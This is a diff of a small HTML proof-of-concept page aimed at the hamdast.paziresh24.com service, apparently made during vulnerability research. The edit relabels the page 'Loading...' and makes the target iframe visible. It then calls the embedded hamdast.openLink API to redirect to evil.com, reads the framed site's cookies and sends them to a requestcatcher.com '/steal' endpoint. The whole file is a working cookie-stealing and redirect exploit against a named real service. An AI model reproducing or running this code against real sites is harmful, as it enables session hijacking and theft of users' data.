@@ -1,34 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC - hamdast.js</title>
+    <title>Loading...</title>
 </head>
 <body>
-    <iframe src="https://hamdast.paziresh24.com" width="1" height="1" style="display:none;"></iframe>
-    <a href="#" id="clickBtn">Click here to continue</a>
+    <iframe src="https://hamdast.paziresh24.com" width="100%" height="500"></iframe>
     <script>
         const iframe = document.querySelector('iframe');
-        const btn = document.getElementById('clickBtn');
-
         iframe.onload = function () {
             try {
+                iframe.contentWindow.hamdast.openLink({ url: 'https://evil.com' });
+
                 const cookie = iframe.contentWindow.document.cookie;
                 if (cookie) {
                     fetch('https://simon.requestcatcher.com/steal?cookie=' + encodeURIComponent(cookie));
                 }
             } catch (e) {
-                console.log('Error:', e.message);
+                console.log('Error:', e);
             }
         };
-
-        btn.addEventListener('click', function (e) {
-            e.preventDefault();
-            try {
-                iframe.contentWindow.hamdast.openLink({ url: 'https://www.google.com' });
-            } catch (e) {
-                console.log('Error:', e.message);
-            }
-        });
     </script>
 </body>
 </html>
